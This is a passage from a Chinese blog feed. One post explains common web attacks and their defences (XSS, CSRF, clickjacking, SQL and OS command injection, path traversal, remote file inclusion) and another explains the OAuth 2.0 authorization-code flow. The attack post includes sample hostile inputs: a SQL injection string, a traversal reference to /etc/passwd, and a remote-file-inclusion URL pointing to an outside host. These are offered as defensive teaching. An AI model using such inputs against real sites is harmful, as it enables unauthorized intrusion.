<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection: 0     </span><br><span class="line">禁止 XSS 过滤。     </span><br><span class="line"></span><br><span class="line">X-XSS-Protection: 1       </span><br><span class="line">启用 XSS 过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。  </span><br><span class="line"></span><br><span class="line">X-XSS-Protection: 1; mode=block  </span><br><span class="line">启用 XSS 过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。  </span><br><span class="line"></span><br><span class="line">X-XSS-Protection: 1; report=&lt;reporting-uri&gt;    </span><br><span class="line">启用 XSS 过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。</span><br></pre></td></tr></table></figure>
</li>
<li><p>转义<br>&emsp;&emsp;XSS 攻击主要是通过构造特殊字符来注入脚本。所以在客户端与服务端都进行输入检测，然后对用户输入的数据进行转义。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/"/g</span>, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/'/g</span>, <span class="string">"&amp;#39;"</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤<br>&emsp;&emsp;在富文本中因为需要保留 HTML ，所以我们不能使用转义的方法防御 XSS 攻击，这里使用过滤的方式防御 XSS 攻击，也就是通过只使用白名单允许的 HTML 标记及其属性，来防御攻击。</p>
</li>
<li><p>内容安全策略（csp）<br>&emsp;&emsp;实质是白名单策略，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。</p>
</li>
</ul>
<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><p>叫做“攻击者伪造请求”，更好理解。</p>
<ul>
<li>用户登录一些官方网站。</li>
<li>攻击者伪造一个链接或事件，诱导用户去点击。</li>
<li>用户触发事件后（点击或者触发其他什么事件），执行操作。用户执行了表面的操作，实际上攻击者利用用户触发这个事件，伪造用户在官方网站做一些事情。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul>
<li>张三登录了购物网站。</li>
<li>之后张三不小心点击了攻击者的恶意链接。</li>
<li>在点击链接之后，张三的购物车被清空。此时，张三还并不知情。</li>
</ul>
<h3 id="分析攻击者为什么能成功"><a href="#分析攻击者为什么能成功" class="headerlink" title="分析攻击者为什么能成功"></a>分析攻击者为什么能成功</h3><ul>
<li>张三如果第一次登录购物网站，网站要求用户输入用户名和命名，验证正确才能进入。</li>
<li>此时购物网站在张三登录成功之后，会给张三 Cookie（里面有 Session ID），下次张三登录的时候可以不必输入用户名密码，靠着 Session ID 就可以直接进入。</li>
<li>若张三点击了攻击者的事件之后，其实就是伪造用户去进入购物网站然后执行一些操作（利用张三的权限去做事情）。</li>
<li>此时购物网站的服务器会认为是张三本人在做的一些操作，因为有 Session ID。</li>
</ul>
<h3 id="CSRF-特点"><a href="#CSRF-特点" class="headerlink" title="CSRF 特点"></a>CSRF 特点</h3><ul>
<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
<li>攻击是利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，仅仅是“冒用”，而不是直接窃取数据。</li>
<li>攻击者预测出被攻击的网站接口的所有参数，成功伪造请求。</li>
</ul>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
<li>SameSite 属性<br>Cookie 的 SameSite 属性用来限制第三方 Cookie，从而减少安全风险，可以用来防止 CSRF 攻击和用户追踪。</li>
<li>同源检测<br>在 HTTP 协议中，每一个异步请求都会携带两个 Header ，用于标记来源域名：<ul>
<li>Origin Header</li>
<li>Referer Header</li>
</ul>
</li>
</ul>
<p>&emsp;&emsp;这两个 Header 在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个 Header 中的域名，确定请求的来源域。<br>&emsp;&emsp;通过校验请求的该字段，我们能知道请求是否是从本站发出的。我们可以<strong>通过拒绝非本站发出的请求</strong>，来避免了 CSRF 攻击。</p>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>&emsp;&emsp;点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的<code>iframe</code>，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的<code>iframe</code>页面。通过调整<code>iframe</code>页面的位置，可以诱使用户恰好点击在<code>iframe</code>页面的一些功能性按钮上。  </p>
<p>原理很简单：</p>
<ul>
<li>通过<code>z-index</code>属性让其位于最上层。</li>
<li>通过<code>opacity</code>属性让其透明度为0。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;点击劫持攻击与 CSRF 攻击（详见“跨站点请求伪造”一章）有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作。但是在 CSRF 攻击的过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成。与之相反的是，点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面。</p>
</blockquote>
<h3 id="Flash-点击劫持"><a href="#Flash-点击劫持" class="headerlink" title="Flash 点击劫持"></a>Flash 点击劫持</h3><p>案例：</p>
<ul>
<li>攻击者制作了一个 Flash 游戏，并诱使用户来玩这个游戏。这个游戏就是让用户去点击 “CLICK” 按钮，每次点击后这个按钮的位置都会发生变化。</li>
<li>在其上隐藏了一个看不见的 iframe。</li>
<li>攻击通过诱导用户鼠标点击的位置，能够完成一些较为复杂的流程。</li>
<li>最终通过这一步步的操作，打开了用户的摄像头。</li>
</ul>
<h3 id="其他的点击劫持"><a href="#其他的点击劫持" class="headerlink" title="其他的点击劫持"></a>其他的点击劫持</h3><ul>
<li>图片覆盖攻击</li>
<li>拖拽劫持</li>
<li>触屏劫持（发生在智能手机上的攻击）</li>
</ul>
<h2 id="HTTP-首部注入攻击"><a href="#HTTP-首部注入攻击" class="headerlink" title="HTTP 首部注入攻击"></a>HTTP 首部注入攻击</h2><p>&emsp;&emsp;HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在<strong>响应首部字段</strong>内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p>
<blockquote>
<p>向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。</p>
</blockquote>
<p>&emsp;&emsp;如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段<code>Location</code>和<code>Set-Cookie</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Loaction: http://www.example.com/a.cgi?q=12345  </span><br><span class="line">Set-Cookie: UID=12345</span><br></pre></td></tr></table></figure>

<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
<li>设置任何 Cookie 信息</li>
<li>重定向至任意 URL</li>
<li>显示任意的主体（HTTP 响应截断攻击）</li>
</ul>
<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><blockquote>
<p>&emsp;&emsp;注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件，第一个是<strong>用户能够控制输入</strong>；第二个是<strong>原本程序要执行的代码，拼接了用户输入的数据</strong>。</p>
</blockquote>
<p>&emsp;&emsp;所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。具体来说，它是利用现有应用程序，将（恶意的） SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。<br>&emsp;&emsp;SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
<blockquote>
<p>&emsp;&emsp;比如先前的很多影视网站泄露 VIP 会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到 SQL 注入式攻击。</p>
</blockquote>
<h3 id="如何防御-SQL-注入攻击"><a href="#如何防御-SQL-注入攻击" class="headerlink" title="如何防御 SQL 注入攻击"></a>如何防御 SQL 注入攻击</h3><ul>
<li>使用预编译语句，绑定变量。<code>（最佳方式）</code><br>&emsp;&emsp;使用预编译的 SQL 语句，SQL 语句的语义不会发生改变。在 SQL 语句中，变量用<code>?</code>表示，攻击者无法改变 SQL 的结构，在上面的例子中，即使攻击者插入类似于<code>tom&#39; or&#39;1&#39;=&#39;1</code>的字符串，也只会将此字符串当做<code>username</code>来查询。</li>
<li>使用安全的存储过程对抗 SQL 注入。<br>&emsp;&emsp;使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将 SQL 语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的 SQL 语句。如果无法避免，则应该使用<strong>严格的输入过滤</strong>或者是<strong>编码函数</strong>来处理用户的输入数据。</li>
<li>检查数据类型<br>&emsp;&emsp;检查输入数据的数据类型，在很大程度上可以对抗 SQL 注入。比如用户在输入邮箱时，必须严格按照邮箱的格式；输入时间、日期时，必须严格按照时间、日期的格式，等等，都能避免用户数据造成破坏。但数据类型检查并非万能，如果需求就是需要用户提交字符串，比如一段短文，则需要依赖其他的方法防范 SQL 注入。</li>
<li>使用安全函数  </li>
<li>使用最小权限原则，避免 Web 应用直接使用 root、dbowner 等高权限账户直接连接数据库。<br>&emsp;&emsp;如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web 应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。</li>
</ul>
<h2 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h2><p>&emsp;&emsp;OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。<strong>只要在能调用 Shell 函数的地方就有存在被攻击的风险。</strong><br>&emsp;&emsp;OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。</p>
<h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><ul>
<li>使用了内部调用 Shell 的函数（system、open 等）</li>
<li>将倍加传入的参数传递给内部调用的 shell 的函数</li>
<li>参数中 shell 的元字符没有被转义</li>
</ul>
<h3 id="防御对策"><a href="#防御对策" class="headerlink" title="防御对策"></a>防御对策</h3><ul>
<li>选择不调用 OS 命令的实现方法。不调用利用 shell 的功能，既能杜绝了 OS 命令注入漏洞混入的可能性，又消除了调用 OS 命令的而系统开销，能够从多方面提高应用的性能。</li>
<li>不将外界输入的字符串传递给命令行参数。</li>
<li>使用安全的函数对传递给OS命令参数进行转义。</li>
</ul>
<h2 id="其他一些-Web-攻击"><a href="#其他一些-Web-攻击" class="headerlink" title="其他一些 Web 攻击"></a>其他一些 Web 攻击</h2><h3 id="目录遍历攻击"><a href="#目录遍历攻击" class="headerlink" title="目录遍历攻击"></a>目录遍历攻击</h3><p>&emsp;&emsp;目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（PathTraversal）攻击。<br>&emsp;&emsp;通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用<code>.</code> <code>../</code>等相对路径定位到<code>/etc/passed</code>等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。<br>&emsp;&emsp;固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。</p>
<h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p>&emsp;&emsp;远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>&emsp;&emsp;这主要是 PHP 存在的安全漏洞，对 PHP 的<code>include</code>或<code>require</code>来说，这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。但是，该功能太危险，PHP 5.2.0 之后默认设定此功能无效。<br>&emsp;&emsp;固然存在输出值转义的问题，但更应控制对任意文件名的指定。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">http://example.com/foo.php?mod=news.php</span><br><span class="line"></span><br><span class="line">经过攻击后：</span><br><span class="line">http://example.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=1s</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;攻击者通过把要引入的文件替换成自己的文件，就能攻击到服务器了。</p>
<h3 id="不正确的错误消息处理"><a href="#不正确的错误消息处理" class="headerlink" title="不正确的错误消息处理"></a>不正确的错误消息处理</h3><p>&emsp;&emsp;不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的<strong>错误信息内包含对攻击者有用的信息</strong>。与 Web 应用有关的主要错误信息如下所示：</p>
<ul>
<li>Web 应用抛出的错误消息</li>
<li>数据库等系统抛出的错误消息</li>
</ul>
<p>&emsp;&emsp;Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。</p>
<h3 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h3><p>&emsp;&emsp;开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而与此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原 URL：</span><br><span class="line">http://example.com/?redirect=http://www.tricorder.jp</span><br><span class="line"></span><br><span class="line">被攻击后：</span><br><span class="line">http://example.com/?redirect=http://hackr.jp</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;用户看到 URL 后原以为访问<code>example.com</code>，不料实际上被诱导至<code>hackr.jp</code>这个指定的重定向目标。  </p>
<p>&emsp;&emsp;可信度高的 Web 网站如果开放重定向功能，则很有可能被攻击者选中并用来作为钓鱼攻击的跳板。</p>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>&emsp;&emsp;密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不仅限于 Web 应用，还包括其他的系统（如FTP 或 SSH 等）。有以下几种破解方法：</p>
<ul>
<li>穷举法<br>&emsp;&emsp;对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。</li>
<li>字典攻击<br>&emsp;&emsp;利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;字典攻击中有一种利用其他 Web 网站已泄露的 ID 及密码列表进行的攻击。很多用户习惯随意地在多个 Web 网站使用同一套 ID 及密码，因此攻击会有相当高的成功几率。</p>
</blockquote>
<h3 id="DoS-攻击"><a href="#DoS-攻击" class="headerlink" title="DoS 攻击"></a>DoS 攻击</h3><p>&emsp;&emsp;DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。  </p>
<p>有两种 DOS 攻击方式：</p>
<ul>
<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。（海量请求导致服务器瘫痪，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。）</li>
<li>通过攻击安全漏洞使服务停止。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;多台计算机发起的 DoS 攻击称为 DDoS 攻击（DistributedDenial of Service attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。</p>
</blockquote>
<h3 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h3><p>&emsp;&emsp;后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。  </p>
<p>通常的后门程序分为以下3种类型：</p>
<ul>
<li>开发阶段作为 Debug 调用的后门程序</li>
<li>开发者为了自身利益植入的后门程序</li>
<li>攻击者通过某种方法设置的后门程序</li>
</ul>
<p>&emsp;&emsp;可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web 应用中的后门程序，由于和正常使用时区别不大，通常很难发现。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>《图解 HTTP》</li>
<li>吴瀚清《白帽子讲 Web 安全》</li>
<li><a href="https://segmentfault.com/a/1190000020402185" target="_blank" rel="noopener">跨站脚本攻击 —— XSS</a></li>
<li><a href="https://segmentfault.com/a/1190000021114673" target="_blank" rel="noopener">跨站请求伪造 —— CSRF</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
            <tag> 计算机原理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[理解 OAuth 2.0]]></title>
      <url>/2019/12/30/WhatIsOAuth/</url>
      <content type="html"><![CDATA[<blockquote>
<p>旧：<br><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a>  </p>
</blockquote>
<blockquote>
<p>新：<br><a href="http://www.ruanyifeng.com/blog/2019/04/oauth_design.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/04/oauth_design.html</a><br><a href="http://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="旧"><a href="#旧" class="headerlink" title="旧"></a>旧</h1><p>&emsp;&emsp;<a href="http://en.wikipedia.org/wiki/OAuth" target="_blank" rel="noopener">OAuth</a> 是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是 2.0 版。<br>&emsp;&emsp;本文对 OAuth 2.0 的设计思路和运行流程，做一个简明通俗的解释，主要参考材料为 <a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">RFC 6749</a>。</p>
<figure class="image-box">
                <img src="bg2014051201.png" alt title class>
                <p></p>
            </figure>

<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>&emsp;&emsp;为了理解 OAuth 的适用场合，让我举一个假设的例子。<br>&emsp;&emsp;有一个”云冲印”的网站，可以将用户储存在 Google 的照片，冲印出来。用户为了使用该服务，必须让”云冲印”读取自己储存在 Google 上的照片。<br>&emsp;&emsp;问题是只有得到用户的授权，Google 才会同意”云冲印”读取这些照片。那么，”云冲印”怎样获得用户的授权呢？<br>&emsp;&emsp;传统方法是，用户将自己的 Google 用户名和密码，告诉”云冲印”，后者就可以读取用户的照片了。这样的做法有以下几个严重的缺点：</p>
<blockquote>
<p>（1）”云冲印”为了后续的服务，会保存用户的密码，这样很不安全。<br>（2）Google 不得不部署密码登录，而我们知道，单纯的密码登录并不安全。<br>（3）”云冲印”拥有了获取用户储存在 Google 所有资料的权力，用户没法限制”云冲印”获得授权的范围和有效期。<br>（4）用户只有修改密码，才能收回赋予”云冲印”的权力。但是这样做，会使得其他所有获得用户授权的第三方应用程序全部失效。<br>（5）只要有一个第三方应用程序被破解，就会导致用户密码泄漏，以及所有被密码保护的数据泄漏。</p>
</blockquote>
<p>&emsp;&emsp;OAuth 就是为了解决上面这些问题而诞生的。</p>
<h2 id="名词定义"><a href="#名词定义" class="headerlink" title="名词定义"></a>名词定义</h2><p>&emsp;&emsp;在详细讲解 OAuth 2.0 之前，需要了解几个专用名词。它们对读懂后面的讲解，尤其是几张图，至关重要。</p>
<blockquote>
<p>（1）<strong>Third-party application</strong>：第三方应用程序，本文中又称”客户端”（client），即上一节例子中的”云冲印”。<br>（2）<strong>HTTP service</strong>：HTTP 服务提供商，本文中简称”服务提供商”，即上一节例子中的 Google。<br>（3）<strong>Resource Owner</strong>：资源所有者，本文中又称”用户”（user）。<br>（4）<strong>User Agent</strong>：用户代理，本文中就是指浏览器。<br>（5）<strong>Authorization server</strong>：认证服务器，即服务提供商专门用来处理认证的服务器。<br>（6）<strong>Resource server</strong>：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。</p>
</blockquote>
<p>&emsp;&emsp;知道了上面这些名词，就不难理解，OAuth 的作用就是让”客户端”安全可控地获取”用户”的授权，与”服务商提供商”进行互动。</p>
<h2 id="OAuth-的思路"><a href="#OAuth-的思路" class="headerlink" title="OAuth 的思路"></a>OAuth 的思路</h2><p>&emsp;&emsp;OAuth 在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。<br>&emsp;&emsp;”客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p>
<h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>&emsp;&emsp;OAuth 2.0 的运行流程如下图，摘自 RFC 6749。</p>
<figure class="image-box">
                <img src="bg2014051203.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>（A）用户打开客户端以后，客户端要求用户给予授权。<br>（B）用户同意给予客户端授权。<br>（C）客户端使用上一步获得的授权，向认证服务器申请令牌。<br>（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。<br>（E）客户端使用令牌，向资源服务器申请获取资源。<br>（F）资源服务器确认令牌无误，同意向客户端开放资源。</p>
</blockquote>
<p>&emsp;&emsp;不难看出来，上面六个步骤之中，B 是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。  </p>
<p>&emsp;&emsp;下面一一讲解客户端获取授权的四种模式。</p>
<h2 id="客户端的授权模式"><a href="#客户端的授权模式" class="headerlink" title="客户端的授权模式"></a>客户端的授权模式</h2><p>&emsp;&emsp;客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0 定义了四种授权方式：</p>
<ul>
<li>授权码模式（authorization code）</li>
<li>简化模式（implicit）</li>
<li>密码模式（resource owner password credentials）</li>
<li>客户端模式（client credentials）</li>
</ul>
<h3 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h3><p>&emsp;&emsp;授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与”服务提供商”的认证服务器进行互动。</p>
<figure class="image-box">
                <img src="bg2014051204.png" alt title class>
                <p></p>
            </figure>

<p>它的步骤如下：</p>
<blockquote>
<p>（A）用户访问客户端，后者将前者导向认证服务器。<br>（B）用户选择是否给予客户端授权。<br>（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的”重定向 URI”（redirection URI），同时附上一个授权码。<br>（D）客户端收到授权码，附上早先的”重定向 URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。<br>（E）认证服务器核对了授权码和重定向 URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。</p>
</blockquote>
<p>下面是上面这些步骤所需要的参数。  </p>
<p>A 步骤中，客户端申请认证的 URI，包含以下参数：</p>
<ul>
<li>response_type：表示授权类型，必选项，此处的值固定为 “code”</li>
<li>client_id：表示客户端的 ID，必选项</li>
<li>redirect_uri：表示重定向 URI，可选项</li>
<li>scope：表示申请的权限范围，可选项</li>
<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz</span><br><span class="line">        &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br></pre></td></tr></table></figure>

<p>C 步骤中，服务器回应客户端的 URI，包含以下参数：</p>
<ul>
<li>code：表示授权码，必选项。该码的有效期应该很短，通常设为 10 分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端 ID 和重定向 URI，是一一对应关系。</li>
<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA</span><br><span class="line">          &amp;state=xyz</span><br></pre></td></tr></table></figure>

<p>D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以下参数：</p>
<ul>
<li>grant_type：表示使用的授权模式，必选项，此处的值固定为 “authorization_code”。</li>
<li>code：表示上一步获得的授权码，必选项。</li>
<li>redirect_uri：表示重定向 URI，必选项，且必须与 A 步骤中的该参数值保持一致。</li>
<li>client_id：表示客户端 ID，必选项。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /token HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">grant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA</span><br><span class="line">&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb</span><br></pre></td></tr></table></figure>

<p>E 步骤中，认证服务器发送的 HTTP 回复，包含以下参数：</p>
<ul>
<li>access_token：表示访问令牌，必选项。</li>
<li>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是 bearer 类型或 mac 类型。</li>
<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>
<li>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。</li>
<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Cache-Control: no-store</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;,</span><br><span class="line">  &quot;token_type&quot;:&quot;example&quot;,</span><br><span class="line">  &quot;expires_in&quot;:3600,</span><br><span class="line">  &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;,</span><br><span class="line">  &quot;example_parameter&quot;:&quot;example_value&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

